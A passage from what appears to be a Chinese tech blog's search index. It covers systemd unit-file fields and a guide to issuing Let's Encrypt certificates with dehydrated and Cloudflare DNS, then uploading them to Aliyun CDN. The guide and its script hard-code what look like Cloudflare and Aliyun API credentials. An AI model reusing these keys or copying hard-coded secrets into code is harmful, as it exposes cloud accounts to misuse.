Wants=sshd-keygen.service [Service] EnvironmentFile=/etc/sysconfig/sshd ExecStart=/usr/sbin/sshd -D $OPTIONS ExecReload=/bin/kill -HUP $MAINPID Type=simple KillMode=process Restart=on-failure RestartSec=42s [Install] WantedBy=multi-user.target [Unit] 区块：启动顺序与依赖关系 After 字段：表示如果 network.target 或 sshd-keygen.service 需要启动，那么 sshd.service 应该在它们之后启动。\n相应地，还有一个 Before 字段，定义 sshd.service 应该在哪些服务之前启动。\n注意，After 和 Before 字段只涉及启动顺序，不涉及依赖关系。\n设置依赖关系，需要使用 Wants 字段和 Requires 字段\nWants 字段：表示 sshd.service 与 sshd-keygen.service 之间存在\u0026quot;弱依赖\u0026quot;关系，即如果\u0026quot;sshd-keygen.service\u0026quot;启动失败或停止运行，不影响 sshd.service 继续执行。\nRequires 字段则表示\u0026quot;强依赖\u0026quot;关系，即如果该服务启动失败或异常退出，那么 sshd.service 也必须退出。\n注意，Wants 字段与 Requires 字段只涉及依赖关系，与启动顺序无关，默认情况下是同时启动的。\n[Service] 区块：启动行为 EnvironmentFile 字段：指定当前服务的环境参数文件。该文件内部的 key=value 键值对，可以用 $key 的形式，在当前配置文件中获取。\nExecStart 字段：定义启动进程时执行的命令\nExecReload 字段：重启服务时执行的命令\nExecStop 字段：停止服务时执行的命令\nExecStartPre 字段：启动服务之前执行的命令\nExecStartPost 字段：启动服务之后执行的命令\nExecStopPost 字段：停止服务之后执行的命令\nexample\n[Service] ExecStart=/bin/echo execstart1 ExecStart= ExecStart=/bin/echo execstart2 ExecStartPost=/bin/echo post1 ExecStartPost=/bin/echo post2 上面这个配置文件，第二行 ExecStart 设为空值，等于取消了第一行的设置，运行结果如下。\nexecstart2 post1 post2 所有的启动设置之前，都可以加上一个连词号（-），表示\u0026quot;抑制错误\u0026quot;，即发生错误的时候，不影响其他命令的执行。比如，EnvironmentFile=-/etc/sysconfig/sshd（注意等号后面的那个连词号），就表示即使 /etc/sysconfig/sshd 文件不存在，也不会抛出错误。\nType 字段定义启动类型。它可以设置的值如下。\nsimple（默认值）：ExecStart 字段启动的进程为主进程 forking： ExecStart 字段将以 fork()方式启动，此时父进程将会退出，子进程将成为主进程 oneshot： 类似于 simple，但只执行一次，Systemd 会等它执行完，才启动其他服务 dbus： 类似于 simple，但会等待 D-Bus 信号后启动 notify： 类似于 simple，启动结束后会发出通知信号，然后 Systemd 再启动其他服务 idle： 类似于 simple，但是要等到其他任务都执行完，才会启动该服务。一种使用场合是为让该服务的输出，不与其他服务的输出相混合 example 下面是一个 oneshot 的例子，笔记本电脑启动时，要把触摸板关掉，配置文件可以这样写。\n[Unit] Description=Switch-off Touchpad [Service] Type=oneshot ExecStart=/usr/bin/touchpad-off [Install] WantedBy=multi-user.target 上面的配置文件，启动类型设为 oneshot，就表明这个服务只要运行一次就够了，不需要长期运行。\n如果关闭以后，将来某个时候还想打开，配置文件修改如下。\n[Unit] Description=Switch-off Touchpad [Service] Type=oneshot ExecStart=/usr/bin/touchpad-off start ExecStop=/usr/bin/touchpad-off stop RemainAfterExit=yes [Install] WantedBy=multi-user.target 上面配置文件中，RemainAfterExit 字段设为 yes，表示进程退出以后，服务仍然保持执行。这样的话，一旦使用 systemctl stop 命令停止服务，ExecStop 指定的命令就会执行，从而重新开启触摸板。\nKillMode 字段：定义 Systemd 如何停止 sshd 服务。\n上面这个例子中，将 KillMode 设为 process，表示只停止主进程，不停止任何 sshd 子进程，即子进程打开的 SSH session 仍然保持连接。这个设置不太常见，但对 sshd 很重要，否则你停止服务的时候，会连自己打开的 SSH session 一起杀掉。\nKillMode 字段可以设置的值如下。\ncontrol-group（默认值）：当前控制组里面的所有子进程，都会被杀掉 process：只杀主进程 mixed：主进程将收到 SIGTERM 信号，子进程收到 SIGKILL 信号 none：没有进程会被杀掉，只是执行服务的 stop 命令。 Restart 字段：定义了 sshd 退出后，Systemd 的重启方式。\n上面的例子中，Restart 设为 on-failure，表示任何意外的失败，就将重启 sshd。如果 sshd 正常停止（比如执行 systemctl stop 命令），它就不会重启。\nRestart 字段可以设置的值如下。\nno（默认值）：退出后不会重启 on-success：只有正常退出时（退出状态码为 0），才会重启 on-failure：非正常退出时（退出状态码非 0），包括被信号终止和超时，才会重启 on-abnormal：只有被信号终止和超时，才会重启 on-abort：只有在收到没有捕捉到的信号终止时，才会重启 on-watchdog：超时退出，才会重启 always：不管是什么退出原因，总是重启 RestartSec 字段：表示 Systemd 重启服务之前，需要等待的秒数。上面的例子设为等待 42 秒。\n[Install] 区块 Install 区块，定义如何安装这个配置文件，即怎样做到开机启动\nWantedBy 字段：表示该服务所在的 Target。\nTarget 的含义是服务组，表示一组服务。WantedBy=multi-user.target 指的是，sshd 所在的 Target 是 multi-user.target。\n这个设置非常重要，因为执行 systemctl enable sshd.service 命令时，sshd.service 的一个符号链接，就会放在/etc/systemd/system 目录下面的 multi-user.target.wants 子目录之中。\nSystemd 有默认的启动 Target。\n$ systemctl get-default multi-user.target # 查看 multi-user.target 包含的所有服务 $ systemctl list-dependencies multi-user.target # 切换到另一个 target # shutdown.target 就是关机状态 $ sudo systemctl isolate shutdown.target Target 的配置文件 $ systemctl cat multi-user.target [Unit] Description=Multi-User System Documentation=man:systemd.special(7) Requires=basic.target Conflicts=rescue.service rescue.target After=basic.target rescue.service rescue.target AllowIsolate=yes 注意，Target 配置文件里面没有启动命令。\n上面输出结果中，主要字段含义如下。\nRequires 字段：要求 basic.target 一起运行。\nConflicts 字段：冲突字段。如果 rescue.service 或 rescue.target 正在运行，multi-user.target 就不能运行，反之亦然。\nAfter：表示 multi-user.target 在 basic.target 、 rescue.service、 rescue.target 之后启动，如果它们有启动的话。\nAllowIsolate：允许使用 systemctl isolate 命令切换到 multi-user.target。\n修改配置文件后重启 # 重新加载配置文件 $ sudo systemctl daemon-reload # 重启相关服务 $ sudo systemctl restart foobar ","date":"August 9, 2018","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180809-systemd-tutorial-part-two/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html\" target=\"_blank\" rel=\"noopener\"\u003eSystemd 入门教程：实战篇\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ systemctl cat sshd.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eUnit\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDescription\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eOpenSSH server daemon\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDocumentation\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eman:sshd\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e8\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e man:sshd_config\u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e5\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eAfter\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enetwork.target sshd-keygen.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWants\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esshd-keygen.service\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eService\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eEnvironmentFile\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/etc/sysconfig/sshd\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecStart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/usr/sbin/sshd -D $OPTIONS\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eExecReload\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e/bin/kill -HUP $MAINPID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eType\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esimple\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eKillMode\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eprocess\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRestart\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eon-failure\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eRestartSec\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e42s\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eInstall\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eWantedBy\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003emulti-user.target\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"unit-区块启动顺序与依赖关系\"\u003e[Unit] 区块：启动顺序与依赖关系\u003c/h4\u003e\n\u003cp\u003e\u003ccode\u003eAfter\u003c/code\u003e 字段：表示如果 \u003ccode\u003enetwork.target\u003c/code\u003e 或 \u003ccode\u003esshd-keygen.service\u003c/code\u003e 需要启动，那么 \u003ccode\u003esshd.service\u003c/code\u003e 应该在它们之后启动。\u003c/p\u003e\n\u003cp\u003e相应地，还有一个 \u003ccode\u003eBefore\u003c/code\u003e 字段，定义 \u003ccode\u003esshd.service\u003c/code\u003e 应该在哪些服务之前启动。\u003c/p\u003e\n\u003cp\u003e注意，After 和 Before 字段只涉及启动顺序，不涉及依赖关系。\u003c/p\u003e\n\u003cp\u003e设置依赖关系，需要使用 Wants 字段和 Requires 字段\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eWants\u003c/code\u003e 字段：表示 \u003ccode\u003esshd.service\u003c/code\u003e 与 \u003ccode\u003esshd-keygen.service\u003c/code\u003e 之间存在\u0026quot;弱依赖\u0026quot;关系，即如果\u0026quot;sshd-keygen.service\u0026quot;启动失败或停止运行，不影响 \u003ccode\u003esshd.service\u003c/code\u003e 继续执行。\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eRequires\u003c/code\u003e 字段则表示\u0026quot;强依赖\u0026quot;关系，即如果该服务启动失败或异常退出，那么 \u003ccode\u003esshd.service\u003c/code\u003e 也必须退出。\u003c/p\u003e\n\u003cp\u003e注意，Wants 字段与 Requires 字段只涉及依赖关系，与启动顺序无关，默认情况下是同时启动的。\u003c/p\u003e","tags":["URL","Linux"],"title":"Systemd 入门教程：实战篇"},{"categories":["URL","RAID"],"contents":" Raid10 徹底崩壞 ,壞就壞在同組作 Mirror 硬碟一起故障。 RAID ","date":"August 1, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180801-raid/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://jerry2yang.wordpress.com/2013/01/09/raid10-%E5%BE%B9%E5%BA%95%E5%B4%A9%E5%A3%9E-%E5%A3%9E%E5%B0%B1%E5%A3%9E%E5%9C%A8%E5%90%8C%E7%B5%84%E4%BD%9Cmirror%E7%A1%AC%E7%A2%9F%E4%B8%80%E8%B5%B7%E6%95%85%E9%9A%9C%E3%80%82/\" target=\"_blank\" rel=\"noopener\"\u003eRaid10 徹底崩壞 ,壞就壞在同組作 Mirror 硬碟一起故障。\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://zh.wikipedia.org/wiki/RAID\" target=\"_blank\" rel=\"noopener\"\u003eRAID\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","RAID"],"title":"Raid10 徹底崩壞 ,壞就壞在同組作Mirror硬碟一起故障。"},{"categories":["DNS-01","dehydrated","SSL"],"contents":" dehydrated letsencrypt-cloudflare-hook 由于我们不能上传文件到 CDN 服务器，所以我们不能采用文件验证方式来申请 https 证书。所幸 Let\u0026rsquo;s Encrypt 支持 dns-01 challenge 通过 DNS 验证方式来申请 https 证书。我们使用 Dehydrated 配合 CloudFlare hook 来申请 https 证书。\n# 首先 clone dehydrated 这个仓库 git clone https://github.com/lukas2511/dehydrated # 在 clone 出来的 dehydrated 目录下创建 config 文件，内容参考 config 文件(https://github.com/dehydrated-io/dehydrated/blob/master/docs/examples/config) # 在 config 文件的末尾加上 Cloudflare 相关的信息 echo \u0026#34;export CF_EMAIL=user@example.com\u0026#34; \u0026gt;\u0026gt; config echo \u0026#34;export CF_KEY=K9uX2HyUjeWg5AhAb\u0026#34; \u0026gt;\u0026gt; config # clone Cloudflare hook mkdir hooks git clone https://github.com/kappataumu/letsencrypt-cloudflare-hook hooks/cloudflare # 安装依赖 pip install -r hooks/cloudflare/requirements-python-2.txt # 创建 domains.txt 文件，每行一个域名 [root@db-slave01 dehydrated]# cat domains.txt apk.kosungames.com sp-res.kosungames.com cpweb.kosungames.com # 申请 https 证书 ./dehydrated -c -k hooks/cloudflare/hook.py # 使用 Python 脚本上传证书。脚本需在 dehydrated 目录下 #!/usr/bin/env python from aliyunsdkcore import client from aliyunsdkcdn.request.v20141111 import SetDomainServerCertificateRequest import uuid def upload(domain): cli = client.AcsClient(\u0026#34;LTAI7zSXga2D\u0026#34;, \u0026#34;ed03Mt9xcNkRgmadx0XtpyDje\u0026#34;, \u0026#34;cn-hongkong\u0026#34;) request = SetDomainServerCertificateRequest.SetDomainServerCertificateRequest() request.set_accept_format(\u0026#34;json\u0026#34;) request.set_DomainName(domain) request.set_CertName(domain + str(uuid.uuid1())) #request.set_CertName(domain) #certificate = open(\u0026#34;certs/\u0026#34; + domain + \u0026#34;/fullchain.pem\u0026#34;).read() certificate = open(\u0026#34;certs/\u0026#34; + domain + \u0026#34;/cert.pem\u0026#34;).read() with open(\u0026#34;certs/\u0026#34; + domain + \u0026#34;/chain.pem\u0026#34;) as f: f.readline() f.readline() chain = f.read() certificate += chain key = open(\u0026#34;certs/\u0026#34; + domain + \u0026#34;/privkey.pem\u0026#34;).read() request.set_ServerCertificateStatus(\u0026#39;on\u0026#39;) request.set_ServerCertificate(certificate) request.set_PrivateKey(key) result = cli.do_action_with_exception(request) domain_file=\u0026#34;domains.txt\u0026#34; with open(domain_file) as f: for line in f: domain = line.split()[0] upload(domain) ","date":"July 24, 2018","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2018/20180724-dehydrated/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/lukas2511/dehydrated\" target=\"_blank\" rel=\"noopener\"\u003edehydrated\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/kappataumu/letsencrypt-cloudflare-hook\" target=\"_blank\" rel=\"noopener\"\u003eletsencrypt-cloudflare-hook\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e由于我们不能上传文件到 CDN 服务器，所以我们不能采用文件验证方式来申请 https 证书。所幸 Let\u0026rsquo;s Encrypt 支持 dns-01 challenge 通过 DNS 验证方式来申请 https 证书。我们使用 Dehydrated 配合 CloudFlare hook 来申请 https 证书。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 首先 clone dehydrated 这个仓库\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone https://github.com/lukas2511/dehydrated\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 在 clone 出来的 dehydrated 目录下创建 config 文件，内容参考 config 文件(https://github.com/dehydrated-io/dehydrated/blob/master/docs/examples/config)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 在 config 文件的末尾加上 Cloudflare 相关的信息\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;export CF_EMAIL=user@example.com\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; config\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;export CF_KEY=K9uX2HyUjeWg5AhAb\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; config\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# clone Cloudflare hook\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkdir hooks\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egit clone https://github.com/kappataumu/letsencrypt-cloudflare-hook hooks/cloudflare\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 安装依赖\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epip install -r hooks/cloudflare/requirements-python-2.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 创建 domains.txt 文件，每行一个域名\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eroot@db-slave01 dehydrated\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e# cat domains.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eapk.kosungames.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esp-res.kosungames.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecpweb.kosungames.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 申请 https 证书\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e./dehydrated -c -k hooks/cloudflare/hook.py\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 使用 Python 脚本上传证书。脚本需在 dehydrated 目录下\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/usr/bin/env python\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e aliyunsdkcore \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e client\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e aliyunsdkcdn.request.v20141111 \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e SetDomainServerCertificateRequest\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e uuid\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eupload\u003c/span\u003e(domain):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  cli \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e client\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eAcsClient(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;LTAI7zSXga2D\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ed03Mt9xcNkRgmadx0XtpyDje\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;cn-hongkong\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  request \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e SetDomainServerCertificateRequest\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eSetDomainServerCertificateRequest()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eset_accept_format(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;json\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eset_DomainName(domain)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eset_CertName(domain \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e str(uuid\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003euuid1()))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e#request.set_CertName(domain)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#75715e\"\u003e#certificate = open(\u0026#34;certs/\u0026#34; + domain + \u0026#34;/fullchain.pem\u0026#34;).read()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  certificate \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e open(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;certs/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e domain \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/cert.pem\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;certs/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e domain \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/chain.pem\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ereadline()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ereadline()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    chain \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  certificate \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e chain\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  key \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e open(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;certs/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e domain \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/privkey.pem\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eset_ServerCertificateStatus(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;on\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eset_ServerCertificate(certificate)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  request\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eset_PrivateKey(key)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e cli\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edo_action_with_exception(request)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edomain_file\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan 